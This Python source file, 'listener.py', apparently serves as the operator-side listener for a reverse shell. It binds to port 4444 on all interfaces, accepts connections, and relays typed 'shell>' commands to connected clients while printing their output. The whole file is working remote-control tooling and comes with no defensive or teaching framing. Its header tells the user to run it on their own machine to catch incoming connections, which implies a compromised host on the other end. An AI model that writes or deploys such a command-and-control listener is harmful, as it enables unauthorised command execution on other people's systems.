#!/usr/bin/env python3
# listener.py - Run this on YOUR machine to receive connection

import socket
import sys
import threading
import time

def handle_client(client_socket, addr):
    """Handle the connected client"""
    print(f"\n[+] Connection established from {addr[0]}:{addr[1]}")
    print("[*] Enter commands below (type 'quit' to exit)\n")
    
    while True:
        try:
            # Get command from user
            cmd = input("shell> ")
            
            if cmd.lower() == 'quit':
                client_socket.send(b'quit')
                break
            
            if cmd.strip() == '':
                continue
            
            # Send command to client
            client_socket.send(cmd.encode())
            
            # Receive output
            client_socket.settimeout(2)
            output = b""
            try:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    output += data
                    if len(data) < 4096:
                        break
            except socket.timeout:
                pass
            
            if output:
                print(output.decode(errors='ignore'))
                
        except KeyboardInterrupt:
            print("\n[*] Closing connection...")
            client_socket.send(b'quit')
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    client_socket.close()
    print("[*] Connection closed")

def start_listener(host='0.0.0.0', port=4444):
    """Start the listener server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Listening on {host}:{port}")
        print("[*] Waiting for incoming connections...")
        
        while True:
            client_socket, addr = server.accept()
            # Handle client in a new thread
            client_thread = threading.Thread(
                target=handle_client, 
                args=(client_socket, addr)
            )
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down listener...")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    # Get port from command line or use default
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    start_listener(port=port)